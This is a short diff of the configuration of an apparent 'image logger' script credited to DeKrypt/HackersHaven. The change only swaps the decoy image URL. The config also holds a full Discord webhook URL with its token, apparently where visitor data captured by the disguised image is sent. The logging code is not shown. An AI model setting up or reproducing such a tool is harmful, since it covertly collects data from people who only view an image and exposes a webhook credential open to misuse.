@@ -13,7 +13,7 @@ __author__ = "DeKrypt/HackersHaven"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1492906315096260728/9lZpZcn6iq15HamD1jvEyblXxm6sG8RiY6mykL9U8NgfNcbpzp7FLSagUV88DojpGrTi",
-    "image": "https://static.wikia.nocookie.net/character-stats-and-profiles/images/9/97/Thragg%2C_Invincible_Comics.webp/revision/latest?cb=20241101234942.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQZ51nZgsO_msQti25XHi710wQPVDLZO29-4Q&s.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
